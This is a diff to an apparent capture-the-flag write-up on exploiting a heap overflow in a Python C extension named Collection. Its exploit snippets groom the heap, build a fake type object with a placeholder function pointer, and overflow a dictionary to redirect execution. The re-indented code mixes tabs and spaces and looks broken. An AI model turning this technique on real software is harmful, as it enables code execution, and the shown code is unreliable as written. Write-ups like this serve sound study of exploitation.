@@ -55,7 +55,12 @@ After digging into nearly every function in the library, we checked again the ha
 
 As was described earlier, this function parses the input dictionary, but we didn't mention that it works with the _PyDict_Next method of the Dictionary Object.
 
-    Iterate over all key-value pairs in the dictionary p. The Py_ssize_t referred to by ppos must be initialized to 0 prior to the first call to this function to start the iteration; the function returns true for each pair in the dictionary, and false once all pairs have been reported. The parameters pkey and pvalue should either point to PyObject* variables that will be filled in with each key and value, respectively, or may be NULL. Any references returned through them are borrowed. ppos should not be altered during iteration. Its value represents offsets within the internal dictionary structure, and since the structure is sparse, the offsets are not consecutive.
+    Iterate over all key-value pairs in the dictionary p. The Py_ssize_t referred to by ppos must be initialized to 0 prior
+    to the first call to this function to start the iteration; the function returns true for each pair in the dictionary, 
+    and false once all pairs have been reported. The parameters pkey and pvalue should either point to PyObject* variables
+    that will be filled in with each key and value, respectively, or may be NULL. Any references returned through them are
+    borrowed. ppos should not be altered during iteration. Its value represents offsets within the internal dictionary
+    structure, and since the structure is sparse, the offsets are not consecutive.
 
 Based on its documentation we understood that each dictionary member has an internal indexing system in the dictionary structure. Later on, the Collection library uses it as an offset into an array and initializing for this Collection dictionary members.
 We also know that we can't create a collection from a dictionary bigger than 32 members, which is exactly the size of the array buffer in memory.
@@ -97,20 +102,21 @@ so, we needed to hold a list with pointers to the collections to prevent from th
 	hole_idx = 0
 	length = 0
 	for i in range(5):
-			temp = Collection.Collection({"1":4, "2":i})
-			avoid_gc.append(temp)
-			length += 1
+             temp = Collection.Collection({"1":4, "2":i})
+             avoid_gc.append(temp)
+             length += 1
 			
-			if length > 1:
-					if id(temp) - 0x118 == id(avoid_gc[-2]):     #This means that we created a consecutive allocation on the heap
-							consec_counter += 1
-					else:
-            consec_counter = 0
-			if consec_counter == 2 and hole_idx == 0: 
-					hole_idx = i
-					#holes.append(i-1)
-					hole_holder = temp
-					consec_counter = 0
+              if length > 1:
+                   if id(temp) - 0x118 == id(avoid_gc[-2]):   
+		   #This means that we created a consecutive allocation on the heap
+                       consec_counter += 1
+		    
+                   else:
+		       consec_counter = 0
+                   if consec_counter == 2 and hole_idx == 0: 
+                       hole_idx = i
+                       hole_holder = temp
+                       consec_counter = 0
 
 	del avoid_gc[hole_idx-1]
 
@@ -123,12 +129,12 @@ If we will overwrite that pointer we will get a jump primitive to our own code!
 
 	PyTypeObject = {}
 	for i in range(0,32):
-			if i == 0x13: # PyObject_GenericSetAttr spot
-      
-        PyTypeObject["%d" % i] = 0x41414141
-        continue
+             if i == 0x13: 
+	     # PyObject_GenericSetAttr spot
+                 PyTypeObject["%d" % i] = 0x41414141
+                 continue
     
-    PyTypeObject["%d" % i] = 0x30303030 + i #RBP
+            PyTypeObject["%d" % i] = 0x30303030 + i #RBP
    
 
 	PyTypeObject = Collection.Collection(PyTypeObject)
@@ -140,15 +146,16 @@ If you remember, our controlled data starts right after the header at offset 0x1
 
 	x = {}
 	for i in range(34):
-			if i == 32:
-					x["%d" % (i)] = 0x2
-			elif i == 33:
-					x["%d" % (i)] = id(PyTypeObject) + 0x18
-			else:
-					x["%d" % (i)] = 0xffffff00 + i
+	
+            if i == 32:
+                x["%d" % (i)] = 0x2
+            elif i == 33:
+                x["%d" % (i)] = id(PyTypeObject) + 0x18
+            else:
+                x["%d" % (i)] = 0xffffff00 + i
 
 	for i in range(2):
-			del x["%d" % (i)]
+            del x["%d" % (i)]
 
 
 	a = Collection.Collection(x)
